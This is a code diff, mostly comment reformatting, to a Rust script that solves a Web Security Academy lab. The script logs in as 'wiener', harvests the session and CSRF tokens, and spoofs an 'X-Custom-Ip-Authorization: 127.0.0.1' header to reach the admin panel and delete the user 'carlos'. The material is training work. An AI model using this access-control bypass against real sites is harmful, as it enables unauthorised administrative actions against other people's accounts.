@@ -32,22 +32,28 @@ use text_colorizer::Colorize;
 * Main Function
 *******************/
 fn main() {
-    let url = "https://0a2800640439510284cd1400000a004e.web-security-academy.net"; // change this to your lab URL
-    let client = build_client(); // build the client that will be used for all subsequent requests
+    // change this to your lab URL
+    let url = "https://0a2800640439510284cd1400000a004e.web-security-academy.net";
 
+    // build the client that will be used for all subsequent requests
+    let client = build_client();
+
+    // try to GET /login page
     let get_login = client
         .get(format!("{url}/login"))
         .send()
-        .expect(&format!("{}", "[!] Failed to GET /login".red())); // try to GET /login page
+        .expect(&format!("{}", "[!] Failed to GET /login".red()));
 
     if get_login.status() == 200 {
         println!("{} {}", "1. Fetching /login page..".white(), "OK".green());
 
+        // extract the session
         let session = extract_session_cookie(get_login.headers())
-            .expect(&format!("{}", "[!] Failed to extract the session".red())); // extract the session
+            .expect(&format!("{}", "[!] Failed to extract the session".red()));
 
+        // extract the csrf
         let csrf =
-            extract_csrf(get_login).expect(&format!("{}", "[!] Failed to extract the token".red())); // extract the csrf
+            extract_csrf(get_login).expect(&format!("{}", "[!] Failed to extract the token".red()));
 
         println!(
             "{} {}",
@@ -55,6 +61,7 @@ fn main() {
             "OK".green()
         );
 
+        // try to login as wiener
         let post_login = client
             .post(format!("{url}/login"))
             .form(&HashMap::from([
@@ -64,37 +71,40 @@ fn main() {
             ]))
             .header("Cookie", format!("session={session}"))
             .send()
-            .expect(&format!("{}", "[!] Failed to login".red())); // try to login as wiener
+            .expect(&format!("{}", "[!] Failed to login".red()));
 
         println!("{} {}", "3. Logging in as wiener..".white(), "OK".green());
 
+        // if login is successful, a redirection will occurred
         if post_login.status() == 302 {
+            // extract the new session
             let new_session = extract_session_cookie(post_login.headers()).expect(&format!(
                 "{}",
                 "[!] Failed to extract the new session".red()
-            )); // extract the new session
+            ));
 
             println!(
                 "{} {}",
                 "4. Getting a new session as wiener ..".white(),
                 "OK".green()
             );
-
             println!(
                 "{} {}",
                 "5. Bypassing admin access using custom header..".white(),
                 "OK".green()
             );
 
+            // try to delete carlos
+            // bypass the admin access using this header
             let delete_carlos = client
                 .get(format!("{url}/admin/delete?username=carlos"))
                 .header("Cookie", format!("session={new_session}"))
-                .header("X-Custom-Ip-Authorization", "127.0.0.1") // bypass the admin access using this header
+                .header("X-Custom-Ip-Authorization", "127.0.0.1")
                 .send()
                 .expect(&format!(
                     "{}",
                     "[!] Failed to delete carlos from the admin panel".red()
-                )); // try to delete carlos
+                ));
 
             println!("{} {}", "6. Deleting carlos..".white(), "OK".green());
             println!(
